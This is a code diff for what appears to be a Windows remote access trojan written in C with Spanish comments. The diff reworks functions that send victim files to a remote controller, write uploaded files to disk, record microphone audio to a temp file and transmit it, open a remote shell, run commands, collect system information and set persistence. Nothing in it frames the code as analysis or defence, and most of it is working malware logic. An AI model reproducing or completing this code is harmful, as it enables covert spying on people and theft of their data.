@@ -24,18 +24,18 @@
 
 // Prototipos
 long get_file_size(char* filename);
+char* replaceFile(char* command, char* toReplace);
 char* startRecord(SOCKET conn); 
 char *IsElevated();
 void conection();
 void ash(int conn);
 void _chdir(int conn, char *instruct);
-void strtSnd(int conn, char *instruct);
 void sendVoiceData(char *filename, SOCKET conn);
 void recordAndSave(char *filename);
 int mainLoop(int conn);
 int excndSend(int conn, char *cmd);
 int getPrstnc(int conn, char *method);
-int readNdSndFle(int conn, char *file);
+int readFile(int conn, char *instruct);
 int uploadFunc(char *command, SOCKET conn);
 
 
@@ -96,7 +96,7 @@ void recordAndSave(char *filename) {
 
 }
 
-long get_file_size(char* filename) {
+long get_file_size(char *filename) {
     struct _stat file_status;
     if (_stat(filename, &file_status) < 0) {
         return -1;
@@ -105,14 +105,16 @@ long get_file_size(char* filename) {
 }
 
 void readVoiceData(char* file, SOCKET conn) { 
-    char filename[100];
-    snprintf(filename, 100, "%s", file);
-    FILE* ptr = fopen(filename, "rb");
+    //char filename[100];
+    //snprintf(filename, 100, "%s", file);
+
+    FILE* ptr = fopen(file, "rb");
+    
     char buffer[SOCKBUFF];
     memset(buffer, 0, SOCKBUFF);
 
-    size_t bytesRead;
-    long file_size = get_file_size(filename);
+    size_t bytesRead = 0;
+    long file_size = get_file_size(file);
     char file_size_str[100];
     sprintf(file_size_str, "%ld", file_size);
 
@@ -133,12 +135,11 @@ char *startRecord(SOCKET conn) {
     char* filename = "se2h.wv";
     char* fullPath = malloc(strlen(tempdir) + strlen(filename) + 1);
 
-    // Construimos r1uta
+    // Construimos ruta
     strcpy(fullPath, tempdir); strcat(fullPath, "\\"); strcat(fullPath, filename);
     
     //char* filename = malloc(strlen(fullPath));
 
-    printf("Nombre del archivo temporal: %s\n", fullPath);
     recordAndSave(fullPath);
 
     return fullPath;
@@ -240,131 +241,77 @@ void ash(int conn)
     return;
 }
 
-void strtSnd(int conn, char *instruct){
-    char *file = malloc(strlen(instruct) + 1); // Asigna memoria a 'file'
-    char toReplace[] = "download ";
+int readFile(int conn, char *instruct){
+    char *filename = replaceFile(instruct, "download ");
+    long fullBytes = get_file_size(filename);
 
-    char *substr = strstr(instruct, toReplace);
+    char fullBytesStr[100];
+    snprintf(fullBytesStr, 100, "%ld", fullBytes);
+    send(conn, fullBytesStr, strlen(fullBytesStr), 0);
+    Sleep(300);
+
+    if (fullBytes == -1){
+        send(conn, "-1", 2, 0);
+        return 1;
+    }
+
+    FILE *fp;
+    fp = fopen(filename, "rb");
+
+    char readData[SOCKBUFF];
+    long bytesRead = 0;
+
+    while (true){
+        if ((bytesRead = fread(readData, 1, SOCKBUFF - 1, fp)) <= 0)
+            break;
+
+        readData[bytesRead] = '\0';
+        send(conn, (char *)readData, bytesRead, 0);
+        memset(readData, 0, SOCKBUFF);
+    }
+
+    fclose(fp);
+    Sleep(400);
+    //send(conn, "end\0", strlen("end\0"), 0); 
+    return 0;
+
+}
+
+char* replaceFile(char* command, char* toReplace) {
+    char* file = malloc(strlen(command) + 1); // Asigna memoria a 'file'
+
+    char* substr = strstr(command, toReplace);
     size_t remainingLength = strlen(substr + strlen(toReplace));
     memmove(file, substr + strlen(toReplace), remainingLength + 1);
-    readNdSndFle(conn, file);
+    file[remainingLength] = '\0';
 
-
+    return file;
 }
 
-int writeAndDecodeData(char *data, char *file){  
-    char *base = PathFindFileName(file);   
- 
-    FILE *fp;
-    size_t sizeChars = strlen(data);
-    char* DecodedData = base64_decode(data, sizeChars, &sizeChars);
-    fp = fopen(base, "w");
-    
-    if (fp == NULL){ 
-        return 1;
-    }
+int uploadFunc(char* command, SOCKET conn) {
+    // Encontrar nombre de base (NO RUTA COMPLETA)
+    char* basename = PathFindFileName(replaceFile(command, "upload "));
 
-    fprintf(fp ,"%s" ,DecodedData);
-    fclose(fp);
+    FILE* fp;
+    fp = fopen(basename, "wb");
 
-    return 0;
-    
-}
-
-int uploadFunc(char *command, SOCKET conn){
-    //Variables necesarias 
-    char *file = malloc(strlen(command) + 1); // Asigna memoria a 'file'
-    memset(file, 0, strlen(command) + 1);
-    char toReplace[] = "upload ";
-    
-    char *substr = strstr(command, toReplace);   
-    size_t subLen = strlen(substr + strlen(toReplace));
-    memmove(file, substr + strlen(toReplace), subLen);
-    file[subLen] = '\0'; // Asegúrate de terminar la cadena con el carácter nulo.
-
-    
-    // Lógica para descargar archivos
-    char recvData[SOCKBUFF];  // Utilizamos un búfer para recibir datos
-    char *downloadedData = NULL;
-    size_t downloadedSize = 0;
-
-    // Inicializamos el búfer con valores nulos para evitar problemas con strcat
-    memset(recvData, 0, sizeof(recvData));
-
-    while (true) {
-        int bytesRead = recv(conn, recvData, SOCKBUFF, 0);
-         
-        if (bytesRead <= 0) {
-            // Manejo de error de recepción
-            send(conn, "Error en la recepción de datos.\n", strlen("Error en la recepción de datos.\n"), 0);
-            free(downloadedData);
-            free(file);
-            return 1;
-        }
-
-        if (strstr(recvData, "end\0") != NULL) {  
-            // Recibido el indicador de final "end\0"
-            break;
-        } else { 
-            // Añadir los datos recibidos al búfer de descarga
-            char *temp = realloc(downloadedData, downloadedSize + bytesRead);
-            if (temp == NULL) {
-                // Error de memoria
-                printf("ERRORE\n");
-                free(downloadedData);
-                free(file);
-                return 1;
-            }
-            
-            downloadedData = temp;
-            memcpy(downloadedData + downloadedSize, recvData, bytesRead);
-            downloadedSize += bytesRead; 
-        }
-    }
-    
-    printf("\n\n");
-    writeAndDecodeData(downloadedData, file);
-    Sleep(300);
-    send(conn, "end\0", strlen("end\0"), 0);
-
-    free(downloadedData);
-    free(file);
-    return 0;
-} 
-
-int readNdSndFle(int conn, char *file){
-
-    FILE *ptr;
-    // Abrimos el archivo en modo de lectura
-    ptr = fopen(file, "rb");
-
-    if (ptr == NULL) {
-        send(conn, "No se puede abrir el archivo.\n", strlen("No se puede abrir el archivo.\n"), 0);
-        send(conn, "end\0", strlen("end\0"), 0);
-        return 1;
-    }
-
-    char buffer[2000];  // Búfer para leer desde el archivo
-
-    // Inicializamos los búferes con valores nulos 
-    memset(buffer, 0, sizeof(buffer));
-
-    // Lee el archivo en búferes y codifícalo en Base64 antes de enviarlo
+    unsigned char recvData[SOCKBUFF];
     size_t bytesRead;
 
-    while ((bytesRead = fread(buffer, 1, 2000, ptr) > 0)) {
-        size_t sizeRead = bytesRead;
-        char *base64Encoded = base64_encode(buffer, sizeRead, &sizeRead);
+    while (true) {
+        bytesRead = recv(conn, (char *)recvData, SOCKBUFF, 0);
+        
+        if (strcmp((char *)recvData, "end\0") == 0)
+            break;
 
-        send(conn, base64Encoded, strlen(base64Encoded), 0); 
-        free(base64Encoded);  // Liberar la memoria asignada por base64_encode
+        fwrite(recvData, 1, bytesRead, fp);
+        //fwrite(base64_decode(recvData, bytesRead, &bytesRead), 1, bytesRead, fp);
+        memset(recvData, 0, SOCKBUFF);
+        
     }
 
-    // Cierra el archivo
-    fclose(ptr);
-    Sleep(400);
-    send(conn, "end\0", strlen("end\0"), 0); 
-    return 0;
+    fclose(fp);
+
 }
 
 int getPrstnc(int conn, char *method){
@@ -427,20 +374,20 @@ int mainLoop(int conn){
         else if (strcmp(instruct, "shell") == 0)
             ash(conn);
 
-        else if (strstr(instruct, "download ") != NULL)
-            strtSnd(conn, instruct);
-
+        else if (strstr(instruct, "download ") != NULL){
+            readFile(conn, instruct);
+        }
         else if (strstr(instruct, "exec") != NULL)
             excndSend(conn, instruct);
 
         else if (strstr(instruct, "upload") != NULL)
             uploadFunc(instruct, conn);
 
-        else if (strcmp(instruct, "sysinfo") == 0) {
+        else if (strcmp(instruct, "sysinfo") == 0){
             strtAll(conn);
-            send(conn, "end\0", strlen("end\0"), 0);
-
-        }
+            //send(conn, "end\0", strlen("end\0"), 0);
+        } 
+        
         else if (strcmp(instruct, "lowpersistence") == 0) {
             getPrstnc(conn, "low");
             Sleep(300);
